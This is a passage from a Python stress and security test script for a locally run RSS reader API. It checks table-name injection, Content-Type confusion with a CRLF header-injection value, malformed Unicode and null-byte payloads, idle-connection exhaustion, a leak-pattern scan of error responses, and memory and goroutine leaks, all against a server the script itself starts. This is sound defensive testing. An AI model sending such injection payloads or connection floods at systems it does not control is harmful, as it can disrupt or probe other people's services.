    table_crashes = 0
    for name in table_names:
        safe_name = urllib.request.quote(name, safe="")
        code, body = api.get(f"/api/tables/{safe_name}", timeout=5)
        if code == -1:
            table_crashes += 1
        # Valid tables should return 200, invalid should return error but NOT crash
    t.check(f"Table name injection ({len(table_names)} names): "
            f"{table_crashes} crashes", table_crashes == 0)

    # ── 3j. Content-Type confusion ─────────────────────────────────────
    t.section("Exploits: Content-Type Confusion")
    ct_crashes = 0
    content_types = [
        "text/plain",
        "text/html",
        "application/xml",
        "multipart/form-data; boundary=----WebKitFormBoundary",
        "application/x-www-form-urlencoded",
        "image/png",
        "",
        "application/json; charset=utf-99",
        "application/json\r\nX-Injected: true",  # header injection via CT
    ]
    for ct in content_types:
        try:
            code, _ = api._request("POST", "/api/feeds",
                                   data={"url": "http://example.com/feed.xml"},
                                   headers={"Content-Type": ct}, timeout=5)
            if code == -1:
                ct_crashes += 1
        except Exception:
            ct_crashes += 1
    t.check(f"Content-Type confusion ({len(content_types)} types): "
            f"{ct_crashes} crashes", ct_crashes == 0)

    # ── 3k. Unicode / encoding attacks ─────────────────────────────────
    t.section("Exploits: Unicode & Encoding Attacks")
    unicode_crashes = 0
    unicode_payloads = [
        "\u0000",                     # null byte
        "\uFEFF",                     # BOM
        "\u202E" + "moc.live//:sptth",  # RTL override
        "A\u0300" * 1000,             # combining diacriticals
        "\uD800",                     # lone high surrogate (invalid)
        "\uDFFF",                     # lone low surrogate (invalid)
        "\U0001F4A9" * 500,           # pile of poo emoji * 500
        "\\u0000",                    # escaped null
        "%00",                        # URL null
        "\x00" * 100,                 # raw nulls
    ]
    for payload in unicode_payloads:
        try:
            api.put("/api/settings/unicode_test", data={"value": payload}, timeout=5)
            api.get(f"/api/settings/unicode_test", timeout=5)
        except Exception:
            unicode_crashes += 1
    t.check(f"Unicode attacks ({len(unicode_payloads)} payloads): "
            f"{unicode_crashes} crashes", unicode_crashes == 0)

    # ── 3l. Connection exhaustion (many concurrent connections) ────────
    t.section("Exploits: Connection Exhaustion")
    # Open many connections but don't send anything
    sockets = []
    connected = 0
    for _ in range(100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((api_host, api_port))
            sockets.append(s)
            connected += 1
        except Exception:
            break

    # Verify server still handles new requests
    code, _ = api.get("/api/feeds", timeout=10)
    alive_during = code == 200

    # Close all
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    code, _ = api.get("/api/feeds", timeout=10)
    alive_after = code == 200

    t.check(f"Connection exhaustion ({connected} idle connections): "
            f"alive_during={alive_during}, alive_after={alive_after}",
            alive_after)

    # ── 3m. Verify no sensitive info in error responses ────────────────
    t.section("Exploits: Information Leakage")
    leak_patterns = ["goroutine", "panic", "runtime error", "stack trace",
                     "GOROOT", "GOPATH", "/home/", "C:\\Users\\",
                     "password", "secret", "token"]

    info_leak = False
    test_paths = [
        "/api/articles/DOES_NOT_EXIST",
        "/api/tables/DOES_NOT_EXIST",
        "/api/feeds/DOES_NOT_EXIST",
        "/api/nonexistent",
        "/api/articles/?limit=abc",
    ]
    for path in test_paths:
        code, body = api.get(path, timeout=5)
        body_str = json.dumps(body) if not isinstance(body, str) else body
        for pattern in leak_patterns:
            if pattern.lower() in body_str.lower():
                info_leak = True
                t.log(f"  Leak detected in {path}: contains '{pattern}'")
    t.check("No sensitive info in error responses", not info_leak)

    # ── 3n. Server-status memory baseline check ────────────────────────
    t.section("Exploits: Memory Leak Baseline")
    code1, stats1 = api.get("/api/server-status")
    t.check("Can read server-status", code1 == 200 and isinstance(stats1, dict))

    # Hammer 500 requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
        futs = [pool.submit(lambda: api.get("/api/articles/?limit=50"))
                for _ in range(500)]
        for f in concurrent.futures.as_completed(futs):
            pass

    # Small delay for GC
    time.sleep(2)
    code2, stats2 = api.get("/api/server-status")
    if code1 == 200 and code2 == 200:
        mem1 = stats1.get("memory", {}).get("alloc_mb", 0)
        mem2 = stats2.get("memory", {}).get("alloc_mb", 0)
        # Allow up to 100 MB growth – we're looking for catastrophic leaks
        mem_ok = (mem2 - mem1) < 100
        t.check(f"Memory after 500-req storm: {mem1:.1f}MB -> {mem2:.1f}MB "
                f"(delta={mem2-mem1:.1f}MB)", mem_ok,
                f"Grew by {mem2-mem1:.1f}MB, possible leak")
    else:
        t.check("Memory baseline comparison", False,
                "Could not read server-status")

    # ── 3o. Goroutine leak check ───────────────────────────────────────
    t.section("Exploits: Goroutine Leak Check")
    code1, stats1 = api.get("/api/server-status")
    goroutines_before = stats1.get("goroutines", 0) if code1 == 200 else 0

    # Blast concurrent requests that might leak goroutines
    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
        futs = []
        for _ in range(200):
            futs.append(pool.submit(lambda: api.get("/api/articles/?limit=50")))
            futs.append(pool.submit(lambda: api.get("/api/feeds")))
            futs.append(pool.submit(lambda: api.get("/api/server-status")))
        for f in concurrent.futures.as_completed(futs):
            pass

    time.sleep(3)  # let goroutines settle
    code2, stats2 = api.get("/api/server-status")
    goroutines_after = stats2.get("goroutines", 0) if code2 == 200 else 0

    # Allow some growth (GC, timers) but not unbounded
    goroutine_ok = goroutines_after < goroutines_before + 50
    t.check(f"Goroutines: {goroutines_before} -> {goroutines_after} "
            f"(delta={goroutines_after - goroutines_before})",
            goroutine_ok,
            f"Possible goroutine leak: grew by {goroutines_after - goroutines_before}")


# ════════════════════════════════════════════════════════════════════════════
#  SETUP & MAIN
# ════════════════════════════════════════════════════════════════════════════

def run_stress_test(keep: bool = False, verbose: bool = False,
                    section: str | None = None) -> int:
    t = TestRunner(verbose=verbose)
    rss_server = None
    server_proc = None
    temp_dir = None

    try:
        # ── Prerequisites ──────────────────────────────────────────────
        t.section("Prerequisites")
        t.check("Server binary exists", SERVER_BIN.exists(),
                f"Not found: {SERVER_BIN}\nRun: build.ps1 server")
        if not SERVER_BIN.exists():
            print("\n  Cannot continue without server binary.")
            return t.summary()

        # ── Setup temp environment ─────────────────────────────────────
        t.section("Setup")
        temp_dir = tempfile.mkdtemp(prefix="rss_lance_stress_")
        data_path = os.path.join(temp_dir, "data")
        os.makedirs(data_path)
        t.log(f"Temp dir: {temp_dir}")

        # Pick free port
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("127.0.0.1", 0))
        api_port = sock.getsockname()[1]
        sock.close()

        # Write config
        config_path = os.path.join(temp_dir, "config.toml")
        with open(config_path, "w") as f:
            f.write(textwrap.dedent(f"""\
                [storage]
                type = "local"
                path = "{data_path.replace(os.sep, '/')}"

                [fetcher]
                interval_minutes = 30
                max_concurrent = 2
                user_agent = "RSS-Lance-Stress-Test/1.0"

                [server]
                host = "127.0.0.1"
                port = {api_port}
                frontend_dir = "{str(ROOT / 'frontend').replace(os.sep, '/')}"
                show_shutdown = false

                [compaction]
                articles      = 999
                feeds         = 999
                categories    = 999
                pending_feeds = 999
            """))
        t.check("Config written", os.path.exists(config_path))

        # ── Start RSS server & populate data ───────────────────────────
        t.section("Local RSS Server & Data Population")
        rss_server, rss_port = start_rss_server()
        t.log(f"RSS server on port {rss_port}")

        # Import and use the fetcher to populate data
        from config import Config
        from db import DB
        from feed_parser import fetch_feed

        config = Config(path=config_path)
        config.storage_path = data_path
        db = DB(config)

        feed_url = f"http://127.0.0.1:{rss_port}/feed_stress.xml"
        t.log("Fetching stress test feed...")
        result = fetch_feed(feed_url, "tmp", user_agent="Stress-Test/1.0")
        t.check("Feed parsed", result.error == "",
                f"Error: {result.error}")
        t.check(f"Feed has {len(result.articles)} articles",
                len(result.articles) == 20)

        feed_id = db.add_feed(
            url=feed_url,
            title=result.title,
            site_url=result.site_url,
        )
        for a in result.articles:
            a["feed_id"] = feed_id
        db.add_articles(result.articles)
        db.update_feed_after_fetch(feed_id, success=True)
        t.log(f"Feed added: {feed_id[:8]}...")

        # ── Start Go server ────────────────────────────────────────────
        t.section("Start API Server")
        server_log_path = os.path.join(temp_dir, "server.log")
        server_log = open(server_log_path, "w")
        server_proc = subprocess.Popen(
            [str(SERVER_BIN), "-config", config_path],
            stdout=server_log,
            stderr=subprocess.STDOUT,
            cwd=str(ROOT),
        )
        t.log(f"Server PID {server_proc.pid} on port {api_port}")

        # Wait for ready
        api_base = f"http://127.0.0.1:{api_port}"
        api = APIClient(api_base, verbose=verbose)
        ready = False
        for _ in range(60):
            try:
                code, body = api.get("/api/feeds")
                if code == 200:
                    ready = True
                    break
            except Exception:
                pass
            time.sleep(0.5)
        t.check("Server is ready", ready)
        if not ready:
            print("  Server failed to start. Log tail:")
            server_log.flush()
            try:
                with open(server_log_path) as f:
                    print(f.read()[-2000:])
            except Exception:
                pass
            return t.summary()

        # Collect article IDs
        code, articles = api.get("/api/articles/?limit=50")
        article_ids = [a["article_id"] for a in articles] if code == 200 else []
        t.check(f"Collected {len(article_ids)} article IDs", len(article_ids) > 0)

        api_host = "127.0.0.1"

        # ── Run test sections ──────────────────────────────────────────
        if section is None or section == "race":
            run_race_tests(t, api, article_ids, feed_id)

        if section is None or section == "fuzz":
            run_fuzz_tests(t, api, article_ids, feed_id, api_port)

        if section is None or section == "exploit":
            run_exploit_tests(t, api, article_ids, feed_id, api_host, api_port)

        # ── Final health check ─────────────────────────────────────────
        t.section("Final Health Check")
        code, feeds = api.get("/api/feeds")
        t.check("Feeds endpoint still works", code == 200)

        code, articles = api.get("/api/articles/?limit=50")
        t.check("Articles endpoint still works",
                code == 200 and isinstance(articles, list))

        code, status = api.get("/api/status")
        t.check("Status endpoint still works", code == 200)

        code, ss = api.get("/api/server-status")
        if code == 200:
            t.log(f"Final memory: {ss.get('memory', {}).get('alloc_mb', '?')} MB")
            t.log(f"Final goroutines: {ss.get('goroutines', '?')}")

        # Verify the server process hasn't crashed
        poll = server_proc.poll()
        t.check("Server process still running", poll is None,
                f"Server exited with code {poll}" if poll is not None else "")

    except KeyboardInterrupt:
        print("\n  Interrupted by user.")
    except Exception as e:
        t.check(f"Unexpected error: {e}", False, traceback.format_exc())
    finally:
        # ── Cleanup ────────────────────────────────────────────────────
        if server_proc:
            try:
                server_proc.terminate()
                server_proc.wait(timeout=10)
            except Exception:
                server_proc.kill()
        if rss_server:
            rss_server.shutdown()
        if temp_dir and not keep:
            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except Exception:
                pass
        elif temp_dir:
            print(f"\n  Kept temp dir: {temp_dir}")

    return t.summary()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RSS-Lance Stress & Security Tests")
    parser.add_argument("--keep", action="store_true",
                        help="Keep temp data directory after run")
    parser.add_argument("--verbose", action="store_true",
                        help="Show HTTP response details")
    parser.add_argument("--section", choices=["race", "fuzz", "exploit"],
                        help="Run only a specific test section")
    args = parser.parse_args()
    sys.exit(run_stress_test(keep=args.keep, verbose=args.verbose,
                             section=args.section))
